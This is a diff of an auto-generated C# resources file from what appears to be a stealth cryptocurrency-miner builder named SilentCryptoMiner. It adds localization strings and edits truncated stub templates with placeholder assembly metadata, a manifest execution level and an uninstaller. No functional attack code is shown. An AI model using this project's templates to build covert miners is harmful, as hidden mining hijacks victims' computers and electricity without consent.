@@ -19,7 +19,7 @@ namespace SilentCryptoMiner.Properties {
     // class via a tool like ResGen or Visual Studio.
     // To add or remove a member, edit your .ResX file then rerun ResGen
     // with the /str option, or rebuild your VS project.
-    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
+    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
     [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
     [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
     public class Resources {
@@ -202,6 +202,32 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+        ///&lt;Localization&gt;
+        ///  &lt;Control Name=&quot;labelLang&quot;&gt;
+        ///    &lt;Text Lang=&quot;en&quot;&gt;Language:&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;sv&quot;&gt;Sprak:&lt;/Text&gt;
+        ///  &lt;/Control&gt;
+        ///  &lt;Control Name=&quot;btnLoadState&quot;&gt;
+        ///    &lt;Text Lang=&quot;en&quot;&gt;Load&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;sv&quot;&gt;Ladda&lt;/Text&gt;
+        ///  &lt;/Control&gt;
+        ///  &lt;Control Name=&quot;btnSaveState&quot;&gt;
+        ///    &lt;Text Lang=&quot;en&quot;&gt;Save&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;sv&quot;&gt;Spara&lt;/Text&gt;
+        ///  &lt;/Control&gt;
+        ///  &lt;Control Name=&quot;btnMinerRemove&quot;&gt;
+        ///    &lt;Text Lang=&quot;en&quot;&gt;Remove&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;sv&quot;&gt;Ta Bort&lt;/Text&gt;
+        ///  &lt;/C [rest of string was truncated]&quot;;.
+        /// </summary>
+        public static string LocalizedControls {
+            get {
+                return ResourceManager.GetString("LocalizedControls", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized resource of type System.Drawing.Bitmap.
         /// </summary>
         public static System.Drawing.Bitmap microsoft_admin {
@@ -243,13 +269,15 @@ namespace SilentCryptoMiner.Properties {
         ///using System.Security.Principal;
         ///using System.Text;
         ///using System.Threading;
+        ///#if DefDebug
         ///using System.Windows.Forms;
+        ///#endif
         ///
         ///#if DefAssembly
         ///[assembly: AssemblyTitle(&quot;%Title%&quot;)]
         ///[assembly: AssemblyDescription(&quot;%Description%&quot;)]
         ///[assembly: AssemblyCompany(&quot;%Company%&quot;)]
-        ///[assembly: AssemblyProduct(&quot;%Product% [rest of string was truncated]&quot;;.
+        ///[assembly: Asse [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Program {
             get {
@@ -316,13 +344,16 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; 
-        ///&lt;asmv1:assembly manifestVersion=&quot;1.0&quot; xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; xmlns:asmv1=&quot;urn:schemas-microsoft-com:asm.v1&quot; xmlns:asmv2=&quot;urn:schemas-microsoft-com:asm.v2&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
-        ///    &lt;assemblyIdentity version=&quot;#MANIFESTVERSION&quot; name=&quot;#MANIFESTNAME&quot; /&gt;
-        ///    &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v2&quot;&gt;
-        ///        &lt;security&gt;
-        ///            &lt;requestedPrivileges xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
-        ///                &lt;re [rest of string was truncated]&quot;;.
+        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+        ///&lt;assembly manifestVersion=&quot;1.0&quot; xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt;
+        ///	&lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v2&quot;&gt;
+        ///		&lt;security&gt;
+        ///			&lt;requestedPrivileges xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
+        ///                &lt;requestedExecutionLevel level=&quot;#MANIFESTLEVEL&quot; uiAccess=&quot;false&quot; /&gt;
+        ///            &lt;/requestedPrivileges&gt;
+        ///        &lt;/security&gt;
+        ///    &lt;/trustInfo&gt;
+        ///&lt;/assembly&gt;  .
         /// </summary>
         public static string template {
             get {
@@ -351,7 +382,7 @@ namespace SilentCryptoMiner.Properties {
         ///
         ///public partial class _rUninstaller_
         ///{
-        ///    public static string _rbD_ = (Envi [rest of string was truncated]&quot;;.
+        ///    public static string _rbD_ = Path. [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Uninstaller {
             get {
